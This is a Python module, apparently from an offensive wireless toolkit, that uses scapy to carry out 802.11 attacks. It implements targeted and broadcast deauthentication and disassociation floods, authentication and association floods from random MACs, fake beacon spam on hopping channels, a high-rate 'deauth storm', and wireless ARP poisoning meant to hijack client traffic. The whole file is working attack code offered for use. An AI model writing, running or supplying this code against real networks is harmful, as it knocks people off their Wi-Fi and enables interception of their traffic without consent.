"""
Network Disruption Module
─────────────────────────
Performs network disruption and airjacking attacks:
  - Airjacking: hijack wireless connections
  - Channel jamming: deny service on specific channels
  - Rate limiting: exhaust client resources
  - deauth storms: mass disconnection attacks
"""

import time
import threading
import random
import subprocess
from collections import defaultdict

from scapy.all import (
    Dot11, Dot11Beacon, Dot11Deauth, Dot11Disas,
    Dot11Elt, RadioTap, ARP, Ether, sendp, sniff, conf
)
from scapy.layers.dot11 import Dot11EltRates, Dot11Auth
from scapy.layers.l2 import LLC, SNAP

from .config import DEAUTH_BURST_COUNT, DEAUTH_BURST_INTERVAL, WIFI_BROADCAST, log


class NetworkDisruption:
    """
    General network disruption engine.
    Provides various denial-of-service and airjacking capabilities.
    """

    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self._thread = None
        self._targets = set()
        self._deauth_only = False

    def _get_random_mac(self):
        """Generate a random locally-administered MAC address."""
        return "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255)
        )

    def add_target(self, bssid, client_mac=None):
        """Add target for disruption."""
        if client_mac:
            self._targets.add((bssid, client_mac))
        else:
            self._targets.add((bssid, None))

    def remove_target(self, bssid, client_mac=None):
        """Remove target from disruption."""
        if client_mac:
            self._targets.discard((bssid, client_mac))
        else:
            self._targets.discard((bssid, None))

    def clear_targets(self):
        """Clear all targets."""
        self._targets.clear()

    def start(self, deauth_only=True):
        """Start network disruption."""
        self.running = True
        self._deauth_only = deauth_only
        log.info(f"Network disruption started on {self.interface}")

        self._thread = threading.Thread(
            target=self._disruption_loop,
            daemon=True
        )
        self._thread.start()

    def _disruption_loop(self):
        """Main disruption loop."""
        while self.running:
            self._perform_disruption()
            time.sleep(DEAUTH_BURST_INTERVAL)

    def _perform_disruption(self):
        """Perform disruption on all targets."""
        for target in list(self._targets):
            bssid, client_mac = target

            if client_mac:
                # Targeted deauth
                self._send_deauth(bssid, client_mac)
                self._send_deauth(client_mac, bssid)
            else:
                # Broadcast deauth (all clients)
                self._send_deauth(bssid, WIFI_BROADCAST)

            if not self._deauth_only:
                # Additional disruption methods
                self._perform_additional_disruption(bssid)

    def _send_deauth(self, src, dst):
        """Send deauthentication frame."""
        frame = (
            RadioTap() /
            Dot11(
                type=0, subtype=12,
                addr1=dst, addr2=src, addr3=src
            ) /
            Dot11Deauth(reason=7)
        )
        sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
              inter=0.01, verbose=False)

    def _perform_additional_disruption(self, bssid):
        """
        Additional disruption methods beyond deauthentication:
        - Sends disassociation frames with varied reason codes to disconnect
          clients at the 802.11 association layer
        - Floods authentication request frames with random MACs to exhaust
          the AP's client tracking table
        """
        # Send disassociation frames with varied reason codes
        reason_codes = [1, 2, 3, 4, 5, 6, 7, 8]
        for reason in random.sample(reason_codes, min(4, len(reason_codes))):
            disas_frame = (
                RadioTap() /
                Dot11(
                    type=0, subtype=10,
                    addr1=WIFI_BROADCAST,
                    addr2=bssid,
                    addr3=bssid
                ) /
                Dot11Disas(reason=reason)
            )
            sendp(disas_frame, iface=self.interface, count=3,
                  inter=0.005, verbose=False)

        # Authentication request flood with random MACs
        for _ in range(10):
            random_mac = self._get_random_mac()
            auth_frame = (
                RadioTap() /
                Dot11(
                    type=0, subtype=11,
                    addr1=bssid,
                    addr2=random_mac,
                    addr3=bssid
                ) /
                Dot11Auth(algo=0, seqnum=1, status=0)
            )
            sendp(auth_frame, iface=self.interface, verbose=False)

    def stop(self):
        """Stop network disruption."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info("Network disruption stopped")


class AirjackingEngine(NetworkDisruption):
    """
    Airjacking: hijack wireless connections.
    Performs advanced attacks to take over client connections.
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._client_mac = None
        self._rogue_mac = None
        self._arp_poison_thread = None
        self._arp_poison_running = False

    def hijack_connection(self, bssid, client_mac, target_bssid=None):
        """
        Hijack client's connection to BSSID.
        Options:
        - Disconnect client from original AP
        - Redirect to rogue AP
        - Perform ARP poisoning on wireless
        """
        self._client_mac = client_mac
        self._rogue_mac = target_bssid or bssid

        log.info(f"Airjacking: {client_mac} <-> {bssid}")

        # Start continuous deauth to disconnect
        self.add_target(bssid, client_mac)
        self.start()

    def perform_arp_poison_wireless(self, bssid, client_mac, gateway_ip):
        """
        Perform ARP poisoning over wireless using monitor mode injection.
        Crafts ARP reply packets wrapped in Dot11/LLC/SNAP layers for
        wireless injection, claiming the gateway IP belongs to our MAC.
        """
        self._arp_poison_running = True
        attacker_mac = self._get_random_mac()

        def _poison_loop():
            log.info(f"Wireless ARP poisoning started: {client_mac} gateway={gateway_ip}")
            while self._arp_poison_running:
                # Craft ARP reply wrapped in 802.11 data frame with LLC/SNAP
                # Tells the client that gateway_ip is at attacker_mac
                arp_reply = (
                    RadioTap() /
                    Dot11(
                        type=2,        # Data frame
                        subtype=0,
                        addr1=client_mac,   # Destination (client)
                        addr2=bssid,        # BSSID (source in DS)
                        addr3=attacker_mac, # Source address
                        FCfield=0x02        # From DS
                    ) /
                    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                    SNAP(OUI=0x000000, code=0x0806) /  # EtherType for ARP
                    ARP(
                        op=2,               # ARP reply
                        hwsrc=attacker_mac,
                        psrc=gateway_ip,
                        hwdst=client_mac,
                        pdst="0.0.0.0"      # Will be filled by target stack
                    )
                )
                sendp(arp_reply, iface=self.interface, verbose=False)

                # Also poison in the other direction (gateway thinks we are client)
                arp_reply_gw = (
                    RadioTap() /
                    Dot11(
                        type=2,
                        subtype=0,
                        addr1=WIFI_BROADCAST,
                        addr2=bssid,
                        addr3=attacker_mac,
                        FCfield=0x02
                    ) /
                    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
                    SNAP(OUI=0x000000, code=0x0806) /
                    ARP(
                        op=2,
                        hwsrc=attacker_mac,
                        psrc=client_mac,
                        hwdst=WIFI_BROADCAST,
                        pdst=gateway_ip
                    )
                )
                sendp(arp_reply_gw, iface=self.interface, verbose=False)

                time.sleep(1)

            log.info("Wireless ARP poisoning stopped")

        self._arp_poison_thread = threading.Thread(
            target=_poison_loop, daemon=True
        )
        self._arp_poison_thread.start()

    def stop(self):
        """Stop airjacking and wireless ARP poisoning."""
        self._arp_poison_running = False
        if self._arp_poison_thread:
            self._arp_poison_thread.join(timeout=5)
        super().stop()
        self._client_mac = None
        self._rogue_mac = None


class ChannelJammer(NetworkDisruption):
    """
    Channel jammer - deny service on specific channels.
    Uses 'iw' command to hop channels and broadcasts fake beacons.
    """

    def __init__(self, interface, channels=None):
        super().__init__(interface)
        self.channels = channels or list(range(1, 12))
        self._channel_idx = 0
        self._beacon_frames = {}

    def jam_channel(self, channel):
        """Jam specific channel."""
        if channel not in self.channels:
            self.channels.append(channel)

    def _set_channel(self, channel):
        """Set interface channel using iw command."""
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            log.warning(f"Failed to set channel {channel}: {e}")

    def _perform_additional_disruption(self, bssid):
        """Channel hopping jamming with proper iw channel set."""
        # Change channel using iw
        self._channel_idx = (self._channel_idx + 1) % len(self.channels)
        target_channel = self.channels[self._channel_idx]
        self._set_channel(target_channel)

        # Send beacon frames on current channel to confuse clients
        self._broadcast_beacon(target_channel)

    def _broadcast_beacon(self, channel):
        """Broadcast fake beacon frames to confuse clients."""
        ssid_names = [b"Free_WiFi", b"xfinity", b"ATT-WIFI", b"linksys",
                      b"NETGEAR", b"default", b"WiFi", b"Internet"]
        chosen_ssid = random.choice(ssid_names)

        frame = (
            RadioTap() /
            Dot11(type=0, subtype=8,
                  addr1=WIFI_BROADCAST,
                  addr2=self._get_random_mac(),
                  addr3=self._get_random_mac()) /
            Dot11Beacon(cap=0x2105) /
            Dot11Elt(ID="SSID", info=chosen_ssid) /
            Dot11Elt(ID="Rates", info=b"\x0c\x12\x18\x24\x30\x48\x60\x6c") /
            Dot11Elt(ID="DSset", info=bytes([channel]))
        )
        sendp(frame, iface=self.interface, count=10, verbose=False)


class RateLimiter(NetworkDisruption):
    """
    Rate limiter - exhaust client resources through connection floods.
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._association_flood = True
        self._authentication_flood = True

    def flood_associations(self, bssid, enabled=True):
        """Enable/disable association flood attack."""
        self._association_flood = enabled

    def flood_authentication(self, bssid, enabled=True):
        """Enable/disable authentication flood attack."""
        self._authentication_flood = enabled

    def _perform_additional_disruption(self, bssid):
        """Perform connection flood attacks."""
        if self._association_flood:
            self._flood_association_requests(bssid)
        if self._authentication_flood:
            self._flood_authentication_requests(bssid)

    def _flood_association_requests(self, bssid):
        """Send association requests to exhaust AP resources."""
        for _ in range(10):
            client_mac = self._get_random_mac()
            frame = (
                RadioTap() /
                Dot11(type=0, subtype=0,
                      addr1=bssid, addr2=client_mac, addr3=bssid) /
                Dot11Elt(ID="SSID", info=b"") /
                Dot11Elt(ID="Rates", info=b"\x0c\x12\x18\x24\x30\x48\x60\x6c")
            )
            sendp(frame, iface=self.interface, verbose=False)

    def _flood_authentication_requests(self, bssid):
        """Send authentication requests to exhaust AP resources."""
        for _ in range(10):
            client_mac = self._get_random_mac()
            frame = (
                RadioTap() /
                Dot11(
                    type=0, subtype=11,
                    addr1=bssid, addr2=client_mac, addr3=bssid
                ) /
                Dot11Auth(algo=0, seqnum=1, status=0)
            )
            sendp(frame, iface=self.interface, verbose=False)


class DeauthStorm(NetworkDisruption):
    """
    Deauth storm - mass deauthentication attack.
    Sends deauth frames to multiple targets simultaneously.
    """

    def __init__(self, interface, burst_size=100):
        super().__init__(interface)
        self.burst_size = burst_size

    def _perform_disruption(self):
        """Send deauth storm."""
        for target in list(self._targets):
            bssid, client_mac = target

            # High-volume deauth burst
            frame = (
                RadioTap() /
                Dot11(type=0, subtype=12,
                      addr1=client_mac or WIFI_BROADCAST,
                      addr2=bssid, addr3=bssid) /
                Dot11Deauth(reason=7)
            )
            sendp(frame, iface=self.interface, count=self.burst_size,
                  inter=0.001, verbose=False)

    def start(self):
        """Start deauth storm."""
        self.running = True
        log.warning(f"DEAUTH STORM ACTIVE - {self.burst_size} frames per burst")
        log.info(f"Targets: {len(self._targets)}")

        self._thread = threading.Thread(
            target=self._storm_loop,
            daemon=True
        )
        self._thread.start()

    def _storm_loop(self):
        """Continuous deauth storm loop."""
        while self.running:
            self._perform_disruption()
            time.sleep(0.5)
